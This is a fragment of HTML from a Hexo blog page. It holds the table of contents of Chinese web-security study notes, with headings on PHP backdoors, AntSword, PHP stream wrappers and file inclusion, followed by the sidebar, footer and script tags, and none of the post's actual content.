class="toc-text">1.基础的底层环境安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%B7%E4%BD%93%E6%8E%AA%E6%96%BD"><span class="toc-number">1.6.2.</span> <span class="toc-text">2.具体措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-php%E5%AE%9E%E9%AA%8C%E5%90%8E%E9%97%A8"><span class="toc-number">1.7.</span> <span class="toc-text">6.php实验后门</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%AC%AC%E4%BA%8C%E5%A4%A9"><span class="toc-number">2.</span> <span class="toc-text">二、第二天</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-php%E5%92%8Cdoker%E6%8B%89%E5%8F%96%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.</span> <span class="toc-text">1.php和doker拉取配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E9%85%8D%E7%BD%AE%EF%BC%88%E5%B7%B2%E5%AE%8C%E6%88%90%EF%BC%89"><span class="toc-number">2.1.1.</span> <span class="toc-text">php配置（已完成）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#docker"><span class="toc-number">2.1.2.</span> <span class="toc-text">docker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%85%8D%E7%BD%AE%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.3.</span> <span class="toc-text">1.配置思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%EF%BC%9A%E6%9E%81%E7%AE%80%E5%AE%89%E8%A3%85-Docker"><span class="toc-number">2.1.4.</span> <span class="toc-text">第一部分：极简安装 Docker</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%83%A8%E5%88%86%EF%BC%9A%E6%A0%B8%E5%BF%83%E9%9A%BE%E7%82%B9%E2%80%94%E2%80%94%E8%A7%A3%E5%86%B3%E2%80%9C%E6%8B%89%E5%8F%96%E4%B8%8D%E5%88%B0%E9%95%9C%E5%83%8F%E2%80%9D"><span class="toc-number">2.1.5.</span> <span class="toc-text">第二部分：核心难点——解决“拉取不到镜像”</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%B8%80%EF%BC%9A%E9%85%8D%E7%BD%AE%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8%EF%BC%88%E5%9F%BA%E7%A1%80%E6%96%B9%E6%A1%88%EF%BC%89"><span class="toc-number">2.1.5.1.</span> <span class="toc-text">方案一：配置国内镜像加速器（基础方案）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%BA%8C%EF%BC%9A%E9%85%8D%E7%BD%AE-Docker-%E4%BB%A3%E7%90%86%EF%BC%88%E8%BF%9B%E9%98%B6%E7%A8%B3%E5%A6%A5%E6%96%B9%E6%A1%88%EF%BC%89"><span class="toc-number">2.1.5.2.</span> <span class="toc-text">方案二：配置 Docker 代理（进阶稳妥方案）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8-Docker-%E6%93%8D%E4%BD%9C%E9%80%9F%E6%9F%A5"><span class="toc-number">2.1.6.</span> <span class="toc-text">第三部分：渗透测试常用 Docker 操作速查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%A6%82%E5%BF%B5%E9%80%9F%E8%A7%A3"><span class="toc-number">2.1.6.1.</span> <span class="toc-text">1. 概念速解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%8F%AA%E6%9C%89-5-%E4%B8%AA%E5%91%BD%E4%BB%A4%E7%9A%84%E2%80%9C%E7%94%9F%E5%AD%98%E6%8C%87%E5%8D%97%E2%80%9D"><span class="toc-number">2.1.6.2.</span> <span class="toc-text">2. 只有 5 个命令的“生存指南”</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E9%83%A8%E5%88%86%EF%BC%9A%E5%B8%B8%E8%A7%81%E2%80%9C%E5%9D%91%E7%82%B9%E2%80%9D%E6%8E%92%E9%9B%B7%E6%8C%87%E5%8D%97"><span class="toc-number">2.1.7.</span> <span class="toc-text">第四部分：常见“坑点”排雷指南</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9D%91%E7%82%B9-2%EF%BC%9A%E7%AB%AF%E5%8F%A3%E5%86%B2%E7%AA%81-Bind-for-0-0-0-0-xx-failed"><span class="toc-number">2.1.7.1.</span> <span class="toc-text">坑点 2：端口冲突 (Bind for 0.0.0.0:xx failed)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9D%91%E7%82%B9-3%EF%BC%9A%E5%90%8D%E5%AD%97%E5%86%B2%E7%AA%81-The-container-name-%E2%80%9C-xxx%E2%80%9D-is-already-in-use"><span class="toc-number">2.1.7.2.</span> <span class="toc-text">坑点 3：名字冲突 (The container name “&#x2F;xxx” is already in use)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E9%83%A8%E5%88%86%EF%BC%9Avscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5docker"><span class="toc-number">2.1.8.</span> <span class="toc-text">第五部分：vscode远程连接docker</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9C%A8vscode%E9%87%8C%E9%9D%A2%E4%B8%8B%E8%BD%BD%E5%A5%BD%E7%9B%B8%E5%85%B3%E7%9A%84%E6%89%A9%E5%B1%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.1.8.1.</span> <span class="toc-text">1.在vscode里面下载好相关的扩展程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.1.8.2.</span> <span class="toc-text">2.虚拟机的远程连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%B8%8B%E8%BD%BD%E8%B0%83%E8%AF%95docker%E7%8E%AF%E5%A2%83"><span class="toc-number">2.1.8.3.</span> <span class="toc-text">3.下载调试docker环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%B0%83%E8%AF%95"><span class="toc-number">2.1.8.4.</span> <span class="toc-text">4.调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0"><span class="toc-number">2.2.</span> <span class="toc-text">2.实验复现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%AC%AC%E4%B8%89%E5%A4%A9"><span class="toc-number">3.</span> <span class="toc-text">三、第三天</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%9A%81%E5%89%91"><span class="toc-number">3.1.</span> <span class="toc-text">1.蚁剑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">3.1.1.</span> <span class="toc-text">安装</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">1.加载器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F%E5%90%8E%E4%BC%9A%E5%87%BA%E7%8E%B0%E4%BB%A5%E4%B8%8B%E9%A1%B5%E9%9D%A2"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">2.安装成功后会出现以下页面</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E9%97%AE%E9%A2%98"><span class="toc-number">3.1.1.3.</span> <span class="toc-text">3.问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%BB%93%E6%9E%9C"><span class="toc-number">3.1.1.4.</span> <span class="toc-text">4.结果</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A"><span class="toc-number">3.2.</span> <span class="toc-text">2.名词解释</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-poc"><span class="toc-number">3.2.1.</span> <span class="toc-text">1.poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-exp"><span class="toc-number">3.2.2.</span> <span class="toc-text">2.exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-payload"><span class="toc-number">3.2.3.</span> <span class="toc-text">3.payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-shellcode"><span class="toc-number">3.2.4.</span> <span class="toc-text">4.shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-php%E6%96%87%E4%BB%B6"><span class="toc-number">3.2.5.</span> <span class="toc-text">5.php文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-php-filter"><span class="toc-number">3.3.</span> <span class="toc-text">3.php:&#x2F;&#x2F;filter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA-php%E6%96%87%E4%BB%B6"><span class="toc-number">3.3.1.</span> <span class="toc-text">1.新建一个.php文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%90%86%E8%A7%A3%E6%AD%A3%E5%B8%B8%E7%9A%84base64-decode"><span class="toc-number">3.3.2.</span> <span class="toc-text">2.理解正常的base64_decode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%95%88%E6%9E%9C"><span class="toc-number">3.3.3.</span> <span class="toc-text">3.效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E2%80%93php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.4.</span> <span class="toc-text">4.封装协议–php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E3%80%90file-%E5%8D%8F%E8%AE%AE%E3%80%91"><span class="toc-number">3.4.1.</span> <span class="toc-text">1.【file:&#x2F;&#x2F;协议】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E3%80%90php-%E5%8D%8F%E8%AE%AE%E3%80%91"><span class="toc-number">3.4.2.</span> <span class="toc-text">2.【php:&#x2F;&#x2F;协议】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E3%80%90zip-bzip2-zlib-%E5%8D%8F%E8%AE%AE%E3%80%91"><span class="toc-number">3.4.3.</span> <span class="toc-text">3.【zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议】</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E3%80%90data-%E5%8D%8F%E8%AE%AE%E3%80%91"><span class="toc-number">3.4.4.</span> <span class="toc-text">4.【data:&#x2F;&#x2F;协议】</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E7%AC%AC%E5%9B%9B%E5%A4%A9"><span class="toc-number">4.</span> <span class="toc-text">四、第四天</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">4.1.</span> <span class="toc-text">1.文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8C%85%E5%90%ABapache%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">4.1.1.</span> <span class="toc-text">1.包含apache日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8C%85%E5%90%ABsession%E2%80%93%E7%94%A8%E6%88%B7%E5%90%8D%E5%8F%AF%E6%8E%A7%EF%BC%8C%E6%89%BE%E5%88%B0%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84"><span class="toc-number">4.1.2.</span> <span class="toc-text">2.包含session–用户名可控，找到物理路径</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="X"
+      data-src="/xxx/images/avatar.jpg">
+  <p class="name" itemprop="name">X</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/xxx/archives/">
+        <span class="count">2</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/xxx/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/xxx/2026/03/23/%E6%B8%97%E9%80%8F1-5/" title="网络安全前五天学习笔记">网络安全前五天学习笔记</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/xxx/2026/03/23/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">X @ Yume Shoka</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2026/03/23/渗透1-5/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/xxx/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
